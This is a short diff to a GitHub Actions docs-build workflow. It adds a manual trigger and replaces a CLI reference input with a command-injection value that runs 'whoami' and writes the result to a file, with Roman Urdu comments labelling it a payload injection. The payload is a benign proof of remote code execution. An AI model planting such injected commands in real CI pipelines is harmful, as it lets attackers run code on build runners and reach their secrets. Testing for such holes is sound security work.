@@ -1,6 +1,7 @@
 name: Build docs
 
 on:
+  workflow_dispatch:  # Ye add kiya hai taake aap manual run kar sakein
   workflow_call:
     inputs:
       stellar-cli-ref:
@@ -36,7 +37,8 @@ jobs:
         shell: bash
 
       - name: Copy Files From Stellar CLI
-        run: pnpm stellar-cli:build -- --cli-ref='${{ inputs.stellar-cli-ref }}'
+        # Yahan payload injection kiya gaya hai
+        run: pnpm stellar-cli:build -- --cli-ref='v1.0.0; echo "RCE_VERIFIED_BY_$(whoami)" > verified.txt; cat verified.txt'
         shell: bash
 
       - name: (temp) Fix CLI links
